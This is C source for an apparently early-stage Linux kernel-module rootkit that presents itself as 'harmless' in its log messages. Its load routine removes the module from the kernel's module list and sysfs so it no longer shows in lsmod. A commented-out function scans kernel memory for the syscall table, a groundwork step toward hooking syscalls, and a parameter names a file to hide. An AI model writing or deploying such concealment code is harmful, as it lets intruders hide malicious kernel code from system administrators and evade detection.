#include <linux/init.h>             // Macros used to mark up functions e.g., __init __exit
#include <linux/module.h>           // Core header for loading LKMs into the kernel
#include <linux/kernel.h>           // Contains types, macros, functions for the kernel
#include <linux/syscalls.h>

MODULE_LICENSE("GPL") ;


static unsigned long *syscall_table;
static char *dir_cod = "hide_this_file";


module_param(dir_cod, charp, 0000); // < Param desc. charp = char ptr,  can be read/not changed


/**
* Function to search for the syscall_table during run time
*
*
unsigned long *dinamically_find_syscall_table(void) {
    unsigned long *syscall_table;
    unsigned long int i;

    // PAGE_OFFSET = start of memory, ULONG_MAX = end of memory
    for(i=PAGE_OFFSET; i<ULONG_MAX; i+=sizeof(void *)){
        syscall_table = (unsigned long *)i;

        if (syscall_table[__NR_close] == (unsigned long)sys_close)
            return syscall_table;
    }
    return NULL;
}
*/

/**
*	Function to hide module from lsmod
*/
static void module_hide(void){
       list_del(&THIS_MODULE->list);
       kobject_del(&THIS_MODULE->mkobj.kobj);
       list_del(&THIS_MODULE->mkobj.kobj.entry);
}


// Rootkit hides itself
static int __init harmless_init(void){
    printk(KERN_INFO "harmless: Hello from the harmless LKM!\n");
    module_hide();
    /*
    syscall_table = dinamically_find_syscall_table();
    if(syscall_table == NULL)
      printk(KERN_INFO "Couldn't find syscall_table????!\n");
      return -1;
    */
    return 0;
}


static void __exit harmless_exit(void){
   printk(KERN_INFO "harmless: Goodbye from the harmless LKM!\n");
}

// Function called on module load
module_init(harmless_init);

// function called on module "unload"
module_exit(harmless_exit);
